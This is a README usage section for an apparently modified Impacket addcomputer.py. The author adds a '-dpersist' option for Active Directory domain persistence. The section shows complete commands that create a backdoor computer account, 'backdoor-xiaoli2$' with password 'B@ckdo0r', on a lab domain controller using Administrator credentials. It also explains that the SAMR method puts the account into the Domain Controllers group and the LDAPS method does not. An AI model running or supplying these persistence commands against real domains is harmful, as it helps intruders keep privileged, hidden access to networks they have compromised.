## Usage

I just add [-dpersist] option for domain persistence. BTW, addcomputer.py default is use SAMR method to process requests.  
```
python3 ./addcomputer.py -computer-name 'backdoor-xiaoli2$' -computer-pass 'B@ckdo0r' -dpersist -dc-ip 192.168.10.90 xiaoli-vuln-2019.com/Administrator:111qqq...
```
![image](https://user-images.githubusercontent.com/30458572/155474120-33fac6d9-6f6f-42d7-8ecb-853fbd50beb0.png)

Difference with LDAPS method, SAMR method will add evil computer account to [Domain Controllers] group.
![image](https://user-images.githubusercontent.com/30458572/155474385-5fc155ab-5f89-42b6-bd57-ae701e446215.png)

LDAPS method will not do this.
```
python3 ./addcomputer.py -computer-name 'backdoor-xiaoli2$' -computer-pass 'B@ckdo0r' -method LDAPS -dpersist -dc-ip 192.168.10.90 xiaoli-vuln-2019.com/Administrator:111qqq...
```
![image](https://user-images.githubusercontent.com/30458572/155474567-34324b0e-db18-4c08-ac00-74acdabd901c.png)
![image](https://user-images.githubusercontent.com/30458572/155474683-7258dac7-c9b2-4a41-a2d6-f1e397980771.png)
